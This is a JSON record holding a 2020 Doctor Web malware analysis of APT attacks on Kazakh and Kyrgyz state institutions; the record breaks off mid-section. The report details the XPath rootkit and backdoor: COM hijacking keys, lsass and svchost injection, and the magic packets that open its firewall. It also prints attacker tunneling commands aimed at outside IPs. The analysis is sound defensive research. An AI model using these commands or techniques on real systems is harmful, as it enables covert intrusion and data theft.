{
    "id": "eecb886d-44d5-4b99-9eed-28bb6df1c20d",
    "created_at": "2022-10-25T16:48:21.171494Z",
    "updated_at": "2025-03-27T02:16:44.765351Z",
    "deleted_at": null,
    "sha1_hash": "7ff8651fcdf8d0213257d3bf05b729b9c11d34b1",
    "title": "Study of the APT attacks on state institutions in Kazakhstan and Kyrgyzstan",
    "authors": "",
    "file_creation_date": "2020-07-20T15:53:16Z",
    "file_modification_date": "2020-07-20T15:53:16Z",
    "file_size": 2979570,
    "plain_text": "# Study of the APT attacks on state institutions in Kazakhstan and Kyrgyzstan\n\n\n-----\n\n**© Doctor Web, Ltd., 2020. All rights reserved.**\n\nThis document is the property of Doctor Web, Ltd. (hereinafter - Doctor Web). No part of this\ndocument may be reproduced, published or transmitted in any form or by any means for any\npurpose other than the purchaser's personal use without proper attribution.\n\nDoctor Web develops and distributes Dr.Web information security solutions which provide\nefficient protection from malicious software and spam.\n\nDoctor Web customers can be found among home users from all over the world and in\ngovernment enterprises, small companies and nationwide corporations.\n\nDr.Web antivirus solutions are well known since 1992 for continuing excellence in malware\ndetection and compliance with international information security standards. State certificates\nand awards received by the Dr.Web solutions, as well as the globally widespread use of our\nproducts are the best evidence of exceptional trust to the company products.\n\n**Study of the APT attacks on state institutions in Kazakhstan and Kyrgyzstan**\n**7/20/2020**\n\nDoctor Web Head Office\n2-12A, 3rd str. Yamskogo polya\nMoscow, Russia\n125040\n\nWebsite: www.drweb.com\nPhone: +7 (495) 789-45-87\n\nRefer to the official website for regional and international office information.\n\n\n-----\n\n## Table of Contents\n\n###### Introduction 4\n\n General Information About the Attack and Tools 5\n\n Operating Routine of Discovered Malware Samples 9\n\n**Trojan.XPath.1** **9**\n\n**Trojan.XPath.2** **11**\n\n**Trojan.XPath.3** **18**\n\n**Trojan.XPath.4** **21**\n\n**BackDoor.Mikroceen.11** **29**\n\n**BackDoor.Logtu.1** **33**\n\n**Trojan.Mirage.1** **42**\n\n**Trojan.Misics.1** **50**\n\n**BackDoor.CmdUdp.1** **65**\n\n**BackDoor.Zhengxianma.1** **66**\n\n**BackDoor.Whitebird.1** **67**\n\n**BackDoor.PlugX.27** **75**\n\n**BackDoor.PlugX.28** **78**\n\n**BackDoor.PlugX.26** **115**\n\n**BackDoor.PlugX.38** **115**\n\n###### Conclusion 133\n\n Appendix. Indicators of Compromise 134\n\n\n-----\n\n### Introduction\n\n\nAs an object of study, targeted cyberattacks on large enterprises and government\ninstitutions are of great interest to information security specialists. The study of such\nincidents makes it possible to analyze the strategy and tools used by hackers to break into\ncomputer systems, and in turn develop appropriate counteraction measures. The software\nused in targeted attacks is usually unique since it is developed in-line with the goals and\nobjectives of the attackers, and is not publicly advertised. In comparison with common\nthreats, samples of such malware rarely become the object of research. In addition, targeted\nattacks use complex mechanisms to hide traces of malicious activity, making it more difficult\nto detect unauthorized presence inside the attacked organization’s infrastructure.\n\nIn March 2019, Doctor Web was contacted by a client from a state institution of the Republic\nof Kazakhstan regarding malware presence on one of the corporate network computers. This\ncase prompted the beginning of an investigation, resulting in the company's specialists\ndiscovering and being the first to describe the family of trojan programs used for a full-scale\ntargeted attack on the institution. The materials we had made it possible to learn more\nabout the tools and goals of cybercriminals who infiltrated the internal computer network.\nThe investigation revealed that the facility’s computer network has been compromised since\nat least December 2017.\n\nIn addition, in February 2020 Doctor Web was contacted by representatives of the state\ninstitution of the Kyrgyz Republic regarding a similar matter — signs of an infected\ncorporate network. Our expertise has confirmed the range of malicious programs operating\nwithin the network. Some modifications of this malware were also used during the attack on\nthe organization in Kazakhstan. Our analysis showed, as in the previous case, the initial\ninfection began long before the enquiry — in March 2017.\n\nBecause the unauthorized presence in both infrastructures continued for at least three years,\nas well as the event logs from servers revealing completely different trojan families, we\nassume that not one, but several hacker groups are likely behind these attacks. With that,\nsome of the trojans used in these attacks are well-known: part of them are exclusive tools of\ncertain APT groups, while the other part is used by various APT groups of China.\n\n\n-----\n\n### General Information About the Attack and Tools\n\nWe were able to study in detail the information from several network servers of the effected\ninstitutions in Kazakhstan and Kyrgyzstan. All devices covered in the study run Microsoft\nWindows operating systems.\n\nMalware used in the targeted attack can be divided into two categories:\n\n1. Common ones installed on most network computers;\n\n2. Specialized ones installed on servers of special interest to the attacker.\n\nThe analyzed malware samples and utilities used by attackers allow us to assume the\nfollowing attack scenario. After successfully exploiting the vulnerabilities and gaining access\nto the network computer, hackers uploaded one of the BackDoor.PlugX modifications to it.\nThe trojan's payload modules allowed attackers to remotely control an infected computer\nand use it for lateral movement. Another trojan, presumably used for initial infection, was\nBackDoor.Whitebird.1. This backdoor was designed to operate in 64-bit operating systems\nand had a universal functionality: supporting an encrypted connection to the C&C server, as\nwell as the file manager, proxy, and for remote control via the command shell functionality.\n\nAfter achieving a network presence, attackers used specialized malware to carry out their\ntasks. This is how specialized trojan programs are distributed among infected devices.\n\nDomain controller #1 Trojan.Misics\n\nTrojan.XPath\n\nDomain controller #2 Trojan.Misics\n\nTrojan.Mirage\n\nDomain controller #3 BackDoor.Mikroceen\n\nBackDoor.Logtu\n\nServer #1 BackDoor.Mikroceen\n\nServer #2 Trojan.Mirage\n\nBackDoor.CmdUdp.1\n\nThe most interesting finding is the XPath family, whose modifications, according to our\ninformation, have not been publicly described before. The family has a rootkit for hiding\nnetwork activity and traces of presence in a compromised system, which was detected by the\nDr.Web anti-rootkit installed on the attacked server. The samples we studied were compiled\nbetween 2017-2018. With that, these malicious programs are based on open source projects\n\n|Domain controller #1|Trojan.Misics Trojan.XPath|\n|---|---|\n|Domain controller #2|Trojan.Misics Trojan.Mirage|\n|Domain controller #3|BackDoor.Mikroceen BackDoor.Logtu|\n|Server #1|BackDoor.Mikroceen|\n|Server #2|Trojan.Mirage BackDoor.CmdUdp.1|\n\n\n-----\n\nreleased several years earlier. Thus, the studied samples used versions of the WinDivert\npackage released between 2013-2015. This indirectly indicates the first XPath modifications\nmay also have been developed during this period.\n\nXPath is a module trojan, each component of which corresponds to a specific stage of\nmalware operation. The infection process begins with the installer operation, detected as\nTrojan.XPath.1. The installer uses an encrypted configuration hardcoded in its body and\nlaunches the payload either by driver installation or by utilizing COM Hijacking. The program\nuses the system registry to store its modules, using both encryption and data compression.\n\nTrojan.XPath.2 is a driver and hides malicious activity in a compromised system by running\nanother module simultaneously. The driver has Chinese digital signatures. Its operation is\nbased on open source projects. Unlike other components stored in the system registry, the\ndriver files are located on a disk, and the malicious program runs covertly. In addition to\nhiding the driver file on the disk, the component is also designed for injecting the payload’s\nloader in the lsass.exe process, as well as concealing the trojan's network activity. The\noperating scenario varies depending on the operating system version.\n\nPayloadDll.c is the original name for the third component. A library detected as\nTrojan.XPath.3 is an intermediate module that injects the payload, saved in the system\nregistry, into the svhost.exe process by utilizing COM Hijacking.\n\nThe main functionality is contained in the payload module detected as Trojan.XPath.4. The\ncomponent is written in C++, and is also based on open source projects. Similar to most of\nthe malware analyzed in this study, this trojan is designed to gain unauthorized access to\ninfected computers and steal confidential data. Its key feature is the ability to operate in two\nmodes. The first is the Client Mode. In this mode, the trojan connects to the C&C server and\nwaits for incoming commands. The second is the Agent Mode. In this mode, Trojan.XPath.4\ncarries server functions: it listens for certain ports, waits for other clients to connect to them,\nand sends commands to these clients. Thus, the malware creators have provided the\npossibility for deploying a local C&C server inside the attacked network to redirect\ncommands from an external C&C server to infected computers inside the network.\n\nFor a detailed description of the XPath family and how it works, see Operating Routine of\nDiscovered Malware Samples.\n\nAnother interesting finding is the Trojan.Mirage access implementation to the command\nshell. To perform command shell I/O redirections, the malware used files that we were able\nto retrieve from an infected server during the investigation. With them we managed to see\nthe commands executed by cybercriminals using the following trojan function, as well as the\ndata received in response:\n\n\n-----\n\nThe launched windbg.exe file was a TCP/UPD port scanner utility called PortQry.\n\nDuring our investigation, we found evidence indirectly confirming the connection of\ntargeted attacks on institutions of Central Asian republics. One of the uncovered samples\ncalled BackDoor.PlugX.38 used the nicodonald[.]accesscam[.]org domain, which was also\nused as the C&C server for BackDoor.Apper.14, also known as ICEFOG NG. A few years ago,\nwe discovered a backdoor of this family in a phishing email sent to one of the state\ninstitutions in Kazakhstan. Also, an RTF document that installs this sample of\nBackDoor.Apper.14 was first uploaded to VirusTotal from Kazakhstan on March 19, 2019.\n\nAn interesting finding within the framework of the Kyrgyzstan incident is the Logtu backdoor\nfound on an infected server along with the Mikroceen backdoor. In addition to a similar set\nof malware used by attackers in both incidents, Mikroceen points to a possible connection\nbetween the two attacks: a sample of this highly specialized backdoor was found on both\nnetworks and in both cases it was installed on the domain controller.\n\nDuring the search for samples related to these attacks, we found a specially made backdoor\nthat implements BIND Shell access to the command shell. The program’s debugging\ninformation contains the project name in Chinese,, which may indicate the\ntrojan’s origin.\n\nIn addition to malicious programs, attackers used the following publicly available utilities\nfor lateral movement within the network:\n\n- Mimikatz\n\n- TCP Port Scanner V1.2 By WinEggDrop\n\n- Nbtscan\n\n- PsExec\n\n- wmiexec.vbs\n\n- goMS17-010\n\n- ZXPortMap v1.0 By LZX\n\n- Earthworm\n\n- PortQry version 2.0 GOLD\n\nExamples of launching some of the listed utilities are shown below.\n\n- ZXPortMap: vmwared.exe 21 46.105.227.110 53\n\n- Earthworm: cryptsocket.exe -s rssocks -d 137.175.79.212 -e 53\n\n\n-----\n\nThe APT group also actively used its own PowerShell scripts to perform various tasks, such as\ncollecting information about an infected computer and other network devices, checking the\nC&C server status from an infected computer, etc. In addition, we found a PowerShell script\ndesigned for downloading all the contents from the Microsoft Exchange Server mailboxes of\nseveral of the organization’s employees.\n\nExamples of certain PowerShell scripts executed on infected servers:\n\n\n-----\n\n### Operating Routine of Discovered Malware Samples\n\n\n#### Trojan.XPath.1\n\n\nTrojan.XPath.1 is an installer for the multi-functional XPath backdoor. It operates on both 32bit and 64-bit Microsoft Windows operating systems. The payload is extracted by installing\nthe driver or by utilizing COM Hijacking.\n\n##### Operating routine\n\nUsing the 5-byte magic number, the installer checks whether the configuration embedded in\nit has encryption. The configuration is then used for the payload functioning. If there is no\nencryption, the program shuts down.\n\nAfter that, the malware receives information about the OS version, UAC settings and checks\nwhether the user has administrative privileges. A string is formed from obtained data:\n```\n admin:%d,dwCPBA:%d,dwLUA:%d,om:%d-%d\n\n```\nThen, the program outputs it via the OutputDebugStringA function.\n\nNext, the trojan attempts to install its driver. In case of failure, an attempt is made to install\nthe module using COM Hijacking.\n\nAfter that, the program deletes its file from the disk and terminates its process.\n\n**Driver installation**\n\nIt deletes the yyyyyyyyGoogle.sys file from the %WINDIR%\\\\tracing\\\\ directory. It\nextracts the desired driver version from its body, depending on the system architecture bit\nwidths, and saves it to the specified path. Drivers are stored in the sample being compressed\nvia the APLib library and are additionally encrypted by an algorithm based on the XOR\noperation with a single-byte key.\n\nIt then stores its payload in the registry as three modules. It uses [HKLM\\\\SOFTWARE\\\n```\n\\Microsoft\\\\LoginInfo] as its working registry branch. It creates keys in it and saves\n\n```\nthe payload there:\n\n- Video — configuration;\n\n- DirectShow — XPath module;\n\n- DirectDraw — PayloadDll module.\n\n\n-----\n\nThe modules are hardcoded in the trojan’s body in a similar form to the driver (using APLib\nand XOR) and are present in two versions — for both 32-bit and 64-bit systems. Each\nmodule uses its own single-byte key. The modules are saved as a structure:\n```\n #pragma pack(push,1)\n struct mod\n {\n  _DWORD compressed_size;\n  _DWORD decompressed_size;\n  _BYTE data[compressed_size];\n };\n #pragma pack(pop)\n\n```\nThe data module is decoded, but remains compressed.\n\nThe program then attempts to create a service with autorun and ImagePath to the extracted\ndriver. The driver file name is used as the service name.\n\nIf the service cannot be launched via SCManager and the service has already been created,\nan attempt is made to start the driver via ZwLoadDriver.\n\nTo check if the driver is working, the malware attempts to open the \\\\.\\BaiduHips\ndevice. In case of failure, a second attempt is made after 100 milliseconds. A total of 15\nattempts are made, after which the driver installation is considered incomplete.\n\nIf the driver is running, it sequentially starts the [%WINDIR%\\\\System32\\\\ping.exe],\n```\n[%WINDIR%\\\\System32\\\\rundll32.exe %WINDIR%\\\\System32\\\\svchost.exe]\n\n```\nand [%WINDIR%\\\\System32\\\\lsass.exe] processes.\n\n**COM Hijacking**\n\nThe program saves its modules in the registry the same way as when installing the driver, but\nthis time using [HKCU\\\\SOFTWARE\\\\Microsoft\\\\LoginInfo] as the home branch.\n\nIt iterates through the registry keys in the HKU section and searches for a key with a name\ncontaining the S-1-5-21- substring and does not contain the _Classes substring. Inside\nthis key, it creates the Software\\\\Classes\\\\CLSID\\\\{ECD4FC4D-521C-11D0-B792```\n00A0C90312E1}\\\\ key for Windows 2000, Windows XP, Windows Server 2003, and the\nSoftware\\\\Classes\\\\CLSID\\\\{B12AE898-D056-4378-A844-6D393FE37956}\\\\\n\n```\nkey for Windows Vista or later. For this key it sets the %TMP%\\\\Microsoft\\\n```\n\\ReplaceDll.dll path as the parameter value (by default). It also creates the\nThreadingModel parameter with the Apartment value.\n\n```\nAfter that, it unpacks the PayloadDll module into the %TMP%\\\\Microsoft\\\n```\n\\ReplaceDll.dll directory.\n\n```\n\n-----\n\n**Artifacts**\n\nThe Trojan.XPath.1 file contains leftover debugging information that reveals the paths and\nsource code file names:\n```\n z:\\\\desk_codes\\\\project_xpath\\\\xpathinstaller\\\\client_files.h\n z:\\\\desk_codes\\\\project_xpath\\\\xpathinstaller\\\\MemLoadDll.h\n xPathInstaller.c\n\n```\nThe original function names are:\n```\n InstallSecFunDriver\n MyZwLoadDriver\n SetMyLoginInfo\n InstallDrv\n\n```\nThe file also contains various debugging messages:\n```\n start TRUE:%s,%d\\n\n pOpenSCManager false:%s,%d\\n\n ZwLoadDriver false1 :%s,%d,%d\\n\n ZwLoadDriver false2 :%s,%d,%d\\n\n ZwLoadDriver false3 :%s,%d,%d\\n\n ZwLoadDriver false1 :%x\\n\n ZwLoadDriver ok : %x\\n\n ZwLoadDriver false: %x\n type:%d\\n\n install all failed\\n\n can not pCreateFile,inst failed :%s,%d\\n\n %s,%d,%d\\n\n admin:%d,dwCPBA:%d,dwLUA:%d,om:%d-%d\n\n```\nThe setinfo false string is the most interesting. It contains the 0xACA3 sybmol, which in\nUnicode corresponds to the hieroglyph. This hieroglyph is used in South and North Korean\nwriting.\n\n\n#### Trojan.XPath.2\n\n\nTrojan.XPath.2 is a driver for the multi-function XPath backdoor. It has two versions for both\n32-bit and 64-bit Microsoft Windows operating systems. The component is designed to\ninject the payload loader into the lsass.exe process, as well as for traffic filtering.\n\n##### Operating routine\n\nTrojan.XPath.1 serves as a loader for the driver. Operating in Windows starting from Vista or\nhigher is based on the source code of the WinDivert 1.1 (30.06.2013) - 1.2 (17.07.2015).\nOperating in Windows starting from Windows 2000 up to Vista is based on the source code\nof the WinPcap.\n\n\n-----\n\nDrivers have the following digital signatures:\n```\nCN = Anhua Xinda (Beijing) Technology Co., Ltd.\nOU = Digital ID Class 3 - Microsoft Software Validation v2\nO = Anhua Xinda (Beijing) Technology Co., Ltd.\nL = Beijing\nS = Beijing\nC = CN\nCN =\nO =\nL =\nS =\nC = CN\n\n```\nThe trojan obtains the addresses of the necessary functions from a NDIS.SYS file:\n\nIt then checks which of the available modules — hal.dll, halmacpi.dll or halacpi.dll — was\nloaded, and gets the addresses of several functions from it:\n\n\n-----\n\nNext, it checks if the ntdll.dll module is loaded. If it is not loaded, Trojan.XPath.2\nindependently maps the file into the memory, and gets the addresses of the necessary\nfunctions:\n\nThen trojan creates the device \\\\Device\\\\test1 and the symbolic link \\\n```\n\\DosDevices\\\\test1.\n\n```\nVia PsSetCreateProcessNotifyRoutine it sets a callback function in which it tracks the\nlsass.exe process creation. As soon as this process is started, the trojan reads the loader\nmodule (Trojan.XPath.3) from the registry [\\\\registry\\\\machine\\\\SOFTWARE\\\n```\n\\Microsoft\\\\LoginInfo] 'DirectDraw'. Then it unpacks it and injects it into the\n\n```\nlsass.exe. In the 64-bit version of the driver, code is injected via the\n```\nPsSetLoadImageNotifyRoutine function.\n\n```\nThe program waits until it can open \\\\Systemroot\\\\explorer.exe, then via\n```\nIoCreateDriver it creates the \\\\FileSystem\\\\FsBaiduHips driver.\n\n```\nIt records the following values in the registry:\n\n\n-----\n\n- [\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\n```\n \\yyyyyyyyGoogle] 'Group' = \"Boot Bus Extender\";\n\n```\n- [\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\n```\n \\yyyyyyyyGoogle] 'DependOnService' = \"FltMgr\";\n\n```\n- [\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\n```\n \\yyyyyyyyGoogle\\\\Instances] 'DefaultInstance' = 'yyyyyyyyGoogle\n Instance';\n\n```\n- [\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\n```\n \\yyyyyyyyGoogle\\\\Instances\\\\yyyyyyyyGoogle Instance] 'Altitude' =\n '399999';\n\n```\n- [\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\\\n```\n \\yyyyyyyyGoogle\\\\Instances\\\\yyyyyyyyGoogle Instance] 'Flags' =\n '00000000'.\n\n```\nThen it attempts to register as a minifilter. If the FltRegisterFilter function returns the\n```\nSTATUS_FLT_INSTANCE_ALTITUDE_COLLISION error, the program reduces the value of\nAltitude by one, and then retries.\n\n```\nWhen registering as the minifilter, the PreOperation callback function is set for\n```\nIRP_MJ_CREATE:\n\n```\nFor IRP_MJ_QUERY_INFORMATION a callback function is set:\n\nFor IRP_MJ_DIRECTORY_CONTROL, both the PreOperation and PostOperation\ncallback functions are set. These four functions are used to conceal the driver file.\n\nThe trojan then creates the device \\\\Device\\\\BaiduHips and the symbolic link \\\n```\n\\DosDevices\\\\BaiduHips.\n\n```\nFurther behavior depends on the infected computer’s OS version.\n\n\n-----\n\n**BaiduHips (Windows 2000, Windows XP, Windows Server 2003)**\n\nThe program registers the BaiduHips NDIS protocol.\n\nTo perform the firewall functionality, the driver intercepts the SendHandler,\n```\nReceiveHandler, ReceivePacketHandler, and OpenAdapterCompleteHandler\n\n```\nfunctions:\n\nHooks are inserted only after receiving the IOCTL code 0x80000800. After that, the\nprogram starts filtering traffic (see below).\n\n**BaiduHips (Windows Vista, Windows Server 2008 or higher)**\n\nIt creates a WDF driver, and passes [\\\\Registry\\\\Machine\\\\System\\\n```\n\\CurrentControlSet\\\\Services\\\\BaiduHips] as the service path.\n\n```\nFurther initialization is similar to the standard initialization of the WinDivert driver. The\ntrojan tracks traffic transmitted over IPv4.\n\nThe most important difference from the standard WinDivert is the windivert_filter\nfunction, which filters packets (see below).\n\n**Firewall**\n\nThe second (in addition to payload launch) main function of the driver is to filter traffic. The\nfirewall filters TCP/UDP packets transmitted over IPv4.\n\n\n-----\n\nThe rules are defined as structures:\n```\n #pragma pack(push, 1)\n struct st_fw_add_tcp\n {\n  _WORD protocol;\n  _DWORD pid;\n  _BYTE src_mac[6];\n  _BYTE dst_mac[6];\n  _DWORD ack;\n  _DWORD sn;\n  _DWORD src_ip;\n  _DWORD dst_ip;\n  _WORD src_port;\n  _WORD dst_port;\n };\n #pragma pack(pop)\n\n```\nThe src_mac, dst_mac, ack, and sn fields are optional. It should be noted that\ndepending on the packet direction, the fields are compared accordingly. In other words, to\ntransmit a packet in both directions between two devices, a single rule is sufficient, where\nthe recipient is the computer that runs this rootkit.\n\nThere are two ways to add firewall rules:\n\n1. Via the corresponding IOCTL code,\n\n2. By sending specially generated packets over the TCP Protocol.\n\n**Special packet 1**\n\nThis is a TCP packet with the following parameters:\n\n- The AckNum value is set to 0x87ED5409;\n\n- The SeqNum value is set to 0x1243FDEC;\n\n- RST flag is set.\n\nWhen such a packet is received, a rule is added to the firewall that allows traffic to pass from\nthe sender's IP address and the src_port + 1 port to the specified destination and in the\nopposite direction.\n\n**Special packet 2**\n\nThis TCP packet size must be 32 bytes. The first 4 bytes are the key for decrypting the rest of\nthe data. Decryption function:\n\n\n-----\n\nNext, bytes from 4 up to 12 are compared with the 1I2#aLeb string. If a match occurs, a\nrule is added to the firewall that allows traffic flow from the sender's IP address and port.\n\nIt is worth noting that the TCP Handshake process is not performed and flags are ignored.\nOnly the size of the data and the data itself matter.\n\n**IOCTL codes**\n\nThe trojan’s IOCTL codes:\n\n- 0x80000800 — to insert hooks on network functions (only available on Windows versions\nup to Windows Vista)\n\n- 0x80000815 — to add a firewall rule for the TCP Protocol;\n\n- 0x80000819 — to delete a firewall rule for the TCP Protocol;\n\n- 0x8000081D — to add a firewall rule for the UDP Protocol;\n\n- 0x80000821 — to delete a firewall rule for the UDP Protocol;\n\n- 0x80001005 — to set the value of two variables (not used).\n\nIOCTL codes from WinDivert (available only for OS versions starting from Vista and higher):\n\n- 0x80002422 — to receive a diverted packet;\n\n- 0x80002425 — to send a packet;\n\n- 0x80002429 — to start filtering;\n\n- 0x8000242D — to set the level;\n\n\n-----\n\n- 0x80002431 — to set the priority;\n\n- 0x80002435 — to set the flags;\n\n- 0x80002439 — to set the parameter;\n\n- 0x8000243E — to receive the parameter’s value.\n\n**Artifacts**\n\nIn addition to project files path disclosed in PDB:\n```\n Z:\\desk_codes\\project_xpath\\ObjFile\\SecKernel\\SecKernel.pdb\n Z:\\desk_codes\\project_xpath\\ObjFile\\SecKernel64\\SecKernel.pdb\n\n```\nThe code contains the names of specific files with the trojan’s source codes:\n```\n bwctrl.c\n Ndis5.c\n Ndis6.c\n SecKernel.c\n\n```\nThere are also various debugging messages:\n\n\n#### Trojan.XPath.3\n\n\nA trojan library written in C and designed to run on the 32-bit and 64-bit Microsoft Windows\noperating systems. It represents one of the components of the Trojan.XPath trojan family\nand is installed by the Trojan.XPath.1 onto the target system. The main function of this library\nis to inject the payload, saved in the registry, into the svhost.exe process.\n\n##### Operating routine\n\nTrojan.XPath.3 has the following system exports:\n\n- DllCanUnloadNow\n\n- DllGetClassObject\n\n\n-----\n\n- DllGetVersion\n\n- DllInstall\n\n- DllRegisterServer\n\n- DllUnregisterServer\n\nThe trojan receives all the necessary imports through the WinAPI\n```\nLoadLibraryA/GetProcAddress, while the names of the required functions in its code\n\n```\nare not encrypted.\n\nIf the trojan runs in the context of the explorer.exe, it checks for the version of the OS where\nit is launched.\n\nFor the operating systems below Windows Vista, Trojan.XPath.3 receives function exports\nfrom the themeui.dll:\n\n- DllCanUnloadNow\n\n- DllGetClassObject\n\n- DllInstall\n\n- DllRegisterServer\n\n- DllUnregisterServer\n\nFor the operating systems starting from Windows Vista and higher, it receives function\nexports from the ExplorerFrame.dll:\n\n- DllCanUnloadNow\n\n- DllGetClassObject\n\n- DllGetVersion\n\n- 0x6E\n\n- 0x6F\n\n- 0x86\n\nThe trojan requires these function addresses in order to call the corresponding functions\nwhenever a trojan library export of the same name is called.\n\nUsing the Global\\\\RunThreadOfWinDDK8O98 mutex, Trojan.XPath.3 verifies only one\ninstance of it is running.\n\nUsing ZwQuerySystemInformation, the trojan counts the number of processes running in\nthe system. It waits until their number exceeds 7, then starts the %WINDIR%\\\\system32\\\n```\n\\svchost.exe process with the CREATE_SUSPENDED flag.\n\n```\nTrojan.XPath.3 reads the DirectShow parameter from the registry thread [HKLM\\\n```\n\\SOFTWARE\\\\Microsoft\\\\LoginInfo] or [HKCU\\\\SOFTWARE\\\\Microsoft\\\n\\LoginInfo] where the payload is stored. It then unpacks the payload using the APLib\n\n```\nlibrary.\n\n\n-----\n\nNext, the trojan allocates a memory block of 0xC80F0 bytes. At the beginning of the block it\nforms the following structure:\n```\n #pragma pack(push,1)\n struct mod\n {\n char char0[128];\n _QWORD LdrLoadDll;\n _QWORD LdrGetProcedureAddress;\n _QWORD ZwProtectVirtualMemory;\n _QWORD ZwCreateSection;\n _QWORD ZwMapViewOfSection;\n _QWORD qwordA8;\n _QWORD NtTerminateThread;\n _QWORD qwordB8;\n _QWORD qwordc0;\n _QWORD is_x64;\n _QWORD payload_size;\n _QWORD qwordd8;\n _BYTE payload[payload_size];\n };\n #pragma pack(pop)\n\n```\nHerewith, in the analyzed sample the char0 value represents a asdsad11111222333\nconstant.\n\nThe trojan allocates a memory block of the size of 0xD80F0 bytes to the previously launched\nsvchost.exe process and copies the entire region of 0xC80F0 bytes onto it.\n\nNext, Trojan.XPath.3 searches for the 0x12345688 constant, which is located in the\nshellcode built into it and replaces it with the memory block address, previously allocated in\nthe svchost.exe process. It then copies this shellcode onto the allocated block using the\n0xC90F0 offset.\n\nFor systems below Windows 8, the trojan receives CONTEXT of the thread in the svchost.exe\nprocess and patches the RIP/EIP register with the shellcode, adding 8 bytes to it. For more\nrecent OS versions, Trojan.XPath.3 launches the thread through NtCreateThreadEx.\n\n**Artifacts**\n\nTraces of the debug information inside the trojan library allow finding the name of the\ntrojan’s source code file: PayloadDll.c.\n\nVarious debugging messages, which are stored in the library:\n\n\n-----\n\n#### Trojan.XPath.4\n\n\nA multifunctional backdoor trojan for the 32-bit and 64-bit versions of the Microsoft\nWindows operating systems. It is one of the components of the Trojan.XPath trojan family. It\nis used for granting unauthorized access to infected computers and performing various\nmalicious actions upon attackers’ commands.\n\nTrojan.XPath.4 is written in C++ and created using several open source projects. One of them\nis the [Cyclone TCP](https://www.oryx-embedded.com/#&panel1-2) library designed for low-level operation within the network. Malware\ncreators modified it to use the WinDivert driver instead of the WinPcap driver. The second\nproject is the modified [libdsm](https://github.com/videolabs/libdsm/) library, which implements the operation through the SMB\nprotocol.\n\n##### Operating routine\n\nThe trojan reads and decrypts the configuration file from the Video or Scsi parameter\nstored in the [HKLM\\\\SOFTWARE\\\\Microsoft\\\\LoginInfo] registry key. It then\nverifies if the first 4 bytes coincide with the 1E 5A CF 24 value and if the 16th bite equals\n```\n0xCE.\n\n```\nNext, Trojan.XPath.4 forms a unique HWID (Hardware ID) identifier of the infected device,\nbased on its hardware configuration.\n\nAfter that, it opens the device \\\\.\\BainduHips to verify the network driver is available.\nDepending on the operating system version, any calls to the driver are performed in a\n\n\n-----\n\nspecific way. The first one is executed in the Windows operating system versions, starting\nfrom Windows 2000 and ending with Windows Server 2003 R2 where the WinCap-based\ndriver is used. The second one is executed on newer versions of Windows where the\nWinDivert-based driver is used.\n\nIn order to determine through which network interfaces the trojan should work, it searches\nfor the network interfaces with types MIB_IF_TYPE_ETHERNET and\n```\nIF_TYPE_IEEE80211, which are connected to the network. If Trojan.XPath.4 is running on a\n\n```\nWindows version earlier than Windows Vista, it sends the IOCTL code 0x80000800 to its\ndriver. After this IOCTL code is received, the driver installs its own hooks onto the handlers,\nwhich are responsible for various functions of the TCP/IP protocol.\n\nBased on that, the trojan can operate in two modes. In the first mode, it functions as a client\n(Client Mode), connecting to the C&C server and waiting for the corresponding commands.\nIn the second mode, the trojan operates as an agent (Agent Mode), listening to the specific\nports, and waiting for other clients to connect and receive their corresponding commands. In\nthis mode, Trojan.XPath.4 acts as a server.\n\n**Operation in the Agent (Server) Mode**\n\nWhile working with the network driver, Trojan.XPath.4 does not actually listen to or receive\nconnections on a port. Instead, the driver listens for traffic on the network interface and\nsends filtered packets to the trojan. As a result, the port, to which the trojan listens, is not\nshown as opened anywhere.\n\nTrojan.XPath.4 checks the current day of the week and the time set in the system settings and\ncompares their values with the data from the configuration file. In this file, there is flag for\neach hour of each day of the week, which inform the trojan if it should run at that specific\ntime. If there is no flag for the current time, the malware will not receive any packets.\n\nTrojan.XPath.4 waits for an incoming packet of 32 bytes. Next, it takes the first 4 bytes as an\nXOR key to decrypt the remaining 28 bytes. The decryption algorithm is shown in the picture\nbelow:\n\n\n-----\n\nAfter decryption, it verifies bytes 4 through 12 and does not perform any further actions if\nthese bytes match the string 1I2#aLeb. If this string is not present, the trojan attempts to\ndecrypt the packet with the AES key instead of the XOR key. Next, the trojan verifies if the\nfirst 4 decrypted bytes match the string 7r#K. If there is no match, the trojan will determine\nan error has occurred, and all further packet processing will be stopped. But in case there is a\nmatch after decryption, this packet will have the following structure:\n```\n #pragma pack(push,1)\n struct st_packet_header\n {\n _BYTE com_flag[4];\n _DWORD packed_size;\n _DWORD decomp_size;\n _DWORD cmdid;\n _BYTE pad[16];\n };\n #pragma pack(pop)\n\n```\nIf the packed_size field has 32 value, and the decomp_size field has the value of 0, the\ntrojan verifies if there is a tunnel to another bot created. If the tunnel exists, Trojan.XPath.4\nredirects the command into it, so that the connected bot can execute it. If there is no tunnel,\nthe trojan executes the command itself.\n\n\n-----\n\nIf the values of the field mentioned earlier are different from those the trojan expects, it will\nround off the size of the packed_size field to the larger value, multiple to 16, which\nrepresents the size of packet’s payload. After that, it receives the rest of the data, decrypts it\nwith one of two AES keys and unpacks it with the LZMA algorithm. Next, it verifies if the size\nof the unpacked data matches the size presented in the decomp_size field of the\n```\nst_packet_header packet. If the site match is confirmed, Trojan.XPath.4 sends the\n\n```\nreceived command into the tunnel or executes it on its own if the tunnel was not created.\n\n**Operation in the Client Mode**\n\nThe trojan will run in this mode if the configuration file contains the C&C server address and\nthe operation mode 3, which corresponds to the Client Mode, is specified. The malware\nsample analyzed has a 4 mode specified, which corresponds to the Agent Mode.\n\nThe trojan generates a random port number within the range of\n```\n65530 and connects to it.\n\n```\nNext, it forms the following packet:\n```\n #pragma pack(push,1)\n struct st_hello\n {\n _DWORD key;\n _BYTE magic[8]; // \"1I2#aLeb\n _DWORD packet_id; // 0x00\n _DWORD dword14; // 0x00\n _WORD port;\n _BYTE byte16[10];\n };\n #pragma pack(pop)\n\n```\nIn the port field it specifies the number of the previously generated port. Next, it takes the\n```\nGetTickCount() value as an XOR key to decrypt the packet, and encrypts this value in its\n\n```\nfirst 4 bytes. The trojan creates the socket, connects to the C&C server listed in the\nconfiguration file, sends the packet, and ends the connection. Upon receipt of this packet,\nthe trojan driver will add IP:port from where the packet originates into the firewall\nexceptions.\n\nNext, Trojan.XPath.4 connects to the same C&C server again, but this time, it 